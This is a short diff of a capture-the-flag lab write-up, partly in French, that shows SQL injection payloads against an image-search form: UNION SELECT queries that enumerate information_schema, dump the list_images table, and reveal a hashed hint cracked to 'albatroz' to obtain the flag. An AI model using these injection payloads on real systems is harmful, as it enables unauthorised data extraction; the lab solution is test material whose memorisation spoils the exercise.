@@ -1,1 +1,41 @@
-SQL Injection : 1 OR 1=1 UNION SELECT NULL, comment FROM list_images
+1 OR 1=1; --
+
+ID: 5 
+Title: Hack me ?
+Url : borntosec.ddns.net/images.png
+
+
+1 UNION SELECT null, database(); -- 
+
+First name: 
+Surname : Member_images
+
+
+1 UNION SELECT TABLE_NAME, TABLE_SCHEMA FROM information_schema.columns; --
+
+Title: list_images
+Url : Member_images
+
+
+1 UNION SELECT TABLE_NAME, COLUMN_NAME FROM information_schema.columns; --
+
+First name: list_images
+Surname : id
+
+First name: list_images
+Surname : url
+
+First name: list_images
+Surname : title
+
+First name: list_images
+Surname : comment
+
+
+1 UNION SELECT id, comment FROM list_images; --
+
+Title: If you read this just use this md5 decode lowercase then sha256 to win this flag ! : 1928e8083cf461a51303633093573c46
+Url : 5
+
+On déchiffre le md5: albatroz
+C'est déjà en minuscule et une fois chiffré en Sh256 on obtient le flag
